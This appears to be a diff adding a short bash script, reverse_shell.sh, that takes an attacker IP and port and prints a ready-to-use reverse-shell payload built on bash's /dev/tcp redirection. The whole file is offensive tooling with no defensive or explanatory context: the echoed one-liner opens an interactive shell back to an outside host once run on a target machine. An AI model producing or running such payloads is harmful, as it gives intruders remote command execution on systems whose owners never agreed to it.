@@ -1,0 +1,13 @@
+#!/bin/bash
+
+# Usage: ./reverse_shell.sh <attacker_ip> <port>
+ATTACKER_IP=$1
+PORT=$2
+
+if [ -z "$ATTACKER_IP" ] || [ -z "$PORT" ]; then
+    echo "Usage: $0 <attacker_ip> <port>"
+    exit 1
+fi
+
+echo "Generating reverse shell payload..."
+echo "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
